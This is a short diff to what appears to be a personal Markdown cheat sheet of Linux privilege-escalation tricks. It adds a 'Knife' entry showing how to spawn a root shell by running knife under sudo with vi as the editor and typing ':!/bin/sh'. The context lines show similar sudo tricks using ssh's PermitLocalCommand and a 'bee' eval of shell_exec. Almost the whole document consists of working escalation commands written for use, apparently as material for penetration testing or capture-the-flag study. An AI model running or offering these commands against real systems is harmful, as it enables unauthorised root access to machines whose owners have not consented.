@@ -15,3 +15,20 @@ ssh -o can make permitlocalcommand=yes, which allow u to run /bin/sh leading to 
 ```
 sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
 ```
+
+---
+
+[[Knife]]
+
+```
+sudo knife data bag create 1 2 -e vi
+```
+
+This opens up the vim editor. We type the below character sequence in the editor to get a shell as root.
+
+```
+:!/bin/sh
+```
+
+---
+
